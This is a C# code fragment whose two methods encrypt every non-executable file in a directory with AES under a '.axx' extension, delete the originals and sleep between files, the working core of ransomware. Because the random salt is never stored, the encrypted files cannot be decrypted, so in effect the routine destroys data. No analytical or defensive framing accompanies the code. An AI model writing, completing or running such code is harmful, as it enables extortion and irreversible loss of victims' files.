private static void EncryptDir(string directoryPath, string key, int delayMilliseconds)
{
    DirectoryInfo directory = new DirectoryInfo(directoryPath);
    FileInfo[] files = directory.GetFiles();
    foreach (FileInfo file in files)
    {
        if (file.Extension.ToLower() != ".exe")
        {
            EncryptFile(file.FullName, file.FullName + ".axx", key);
            File.Delete(file.FullName);
            Thread.Sleep(delayMilliseconds);
        }
    }
}

private static void EncryptFile(string inputFilePath, string outputFilePath, string key)
{
    using (FileStream inputStream = new FileStream(inputFilePath, FileMode.Open, FileAccess.Read))
    using (FileStream outputStream = new FileStream(outputFilePath, FileMode.Create, FileAccess.Write))
    {
        using (Aes aes = Aes.Create())
        {
            byte[] salt = new byte[16];
            RandomNumberGenerator rng = RandomNumberGenerator.Create();
            rng.GetBytes(salt);
            Rfc2898DeriveBytes keyDerivator = new Rfc2898DeriveBytes(key, salt, 1000);
            aes.Key = keyDerivator.GetBytes(32);
            aes.IV = keyDerivator.GetBytes(16);

            using (CryptoStream cryptoStream = new CryptoStream(outputStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
            {
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = inputStream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    cryptoStream.Write(buffer, 0, bytesRead);
                }
            }
        }
    }
}
